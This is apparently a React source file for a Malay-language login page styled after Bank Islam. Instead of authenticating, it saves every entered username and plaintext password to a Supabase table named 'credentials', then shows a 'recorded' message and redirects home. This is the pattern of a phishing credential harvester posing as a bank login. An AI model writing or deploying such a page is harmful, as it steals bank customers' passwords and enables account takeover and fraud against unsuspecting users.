import { useState } from "react";
import type { FormEvent } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Link, useNavigate } from "react-router-dom";
import { supabase } from "@/lib/supabase";
import { showSuccess, showError } from "@/utils/toast";

const LoginPage = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!username || !password) {
      showError("Sila masukkan nama pengguna dan kata laluan.");
      return;
    }

    setIsLoading(true);

    // We will attempt to save the credentials to a table named 'credentials'
    const { error } = await supabase
      .from("credentials")
      .insert([{ username, password }]);

    setIsLoading(false);

    if (error) {
      console.error("Error saving credentials:", error);
      showError("Gagal untuk log masuk. Sila pastikan konfigurasi Supabase anda betul.");
    } else {
      showSuccess("Maklumat berjaya direkodkan!");
      // For demonstration, we'll just redirect to the home page after submission.
      navigate("/");
    }
  };

  return (
    <Card className="w-full max-w-sm text-left shadow-lg animate-fade-in-up">
      <CardHeader>
        <CardTitle className="text-2xl font-bold text-foreground">Log Masuk</CardTitle>
        <CardDescription className="text-foreground/80">
          Masukkan nama pengguna dan kata laluan anda.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="username" className="text-foreground">Username</Label>
            <Input 
              id="username" 
              placeholder="Masukkan nama pengguna anda" 
              required 
              className="bg-bank-islam-red-light border-bank-islam-red-dark placeholder:text-foreground/50"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isLoading}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="password" className="text-foreground">Kata Laluan</Label>
            <Input 
              id="password" 
              type="password" 
              required 
              className="bg-bank-islam-red-light border-bank-islam-red-dark placeholder:text-foreground/50"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading}
            />
          </div>
          <Button type="submit" className="w-full bg-primary hover:bg-primary/90 text-primary-foreground" disabled={isLoading}>
            {isLoading ? "Memproses..." : "Log Masuk"}
          </Button>
          <div className="mt-4 text-center text-sm">
            <Link to="/" className="underline text-primary/80 hover:text-primary">
              Kembali ke Laman Utama
            </Link>
          </div>
        </form>
      </CardContent>
    </Card>
  );
};

export default LoginPage;